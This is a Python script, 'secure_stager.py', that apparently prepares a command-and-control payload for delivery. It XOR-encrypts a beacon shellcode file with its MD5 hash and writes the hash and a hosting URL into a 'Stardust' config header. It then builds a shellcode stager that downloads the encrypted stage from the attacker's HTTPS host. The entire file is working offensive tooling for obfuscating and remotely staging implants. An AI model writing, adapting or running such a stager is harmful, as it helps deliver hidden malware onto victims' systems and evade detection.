import sys
import os
import hashlib
import subprocess
from urllib.parse import urlparse
import shutil

def xor(binary_blob, key):
    
    key_bytes = key.encode()
    
    encrypted = bytearray()
    key_length = len(key_bytes)
    
    for i, byte in enumerate(binary_blob):
        #
        encrypted.append(byte ^ key_bytes[i % key_length])

    return bytes(encrypted)


if len(sys.argv) < 3:
    print("Usage: ./secure_stager.py </path/to/payload/stage.bin> <HTTPS url that stage will be hosted at>")
    print("Example: ./secure_stager.py /home/kali/beacon_x64.bin https://www.myhostingdomain.com/aboutus")
    sys.exit()


os.chdir(os.path.dirname(os.path.abspath(__file__)))

outdir = os.path.dirname(sys.argv[1])
if not outdir:
    outdir = "."

url = urlparse(sys.argv[2])
if not all([url.scheme, url.netloc, url.path]):
    print("[-] Invalid URL supplied! Example: https://yourhostingsite.com/query.txt")
    sys.exit()
elif url.scheme != "https":
    print("[-] Secure stager only supports https connections!")
    sys.exit()


try:
    with open(sys.argv[1], mode='rb') as file: 
        stage = file.read()
except FileNotFoundError:
    print(f"Cannot locate {sys.argv[1]}.")
    sys.exit()


original_stage = f"{outdir}{url.path}_original"
enc_stage = f"{outdir}{url.path}"
stager = f"{outdir}{url.path}_stager.bin"


shutil.move(sys.argv[1], original_stage)


stage_md5 = hashlib.md5(stage).hexdigest()


xor_stage = xor(stage, stage_md5)


with open(enc_stage, mode='wb') as file:
    file.write(xor_stage)

with open("Stardust/include/Config.h", mode ='w') as file:
    file.write(f"#define MD5HASH \"{stage_md5}\"\n")
    file.write(f"#define URL \"{url.netloc}\"\n")
    file.write(f"#define URI \"{url.path}\"")

while True:
    try:
        build_ret = subprocess.run(["make", "-C", "Stardust"], capture_output=True, text=True, check=True)
        break
    except subprocess.CalledProcessError:
        pass

shutil.move("Stardust/bin/stardust.x64.bin", stager)

print("[SECURE STAGER]")
print(f"Original payload hash: {stage_md5}")
print(f"Original payload renamed to {original_stage}")
print(f"Encrypted payload saved as {enc_stage} | Serve this file at {sys.argv[2]}")
print(f"Secure stager generated and saved as {stager}")
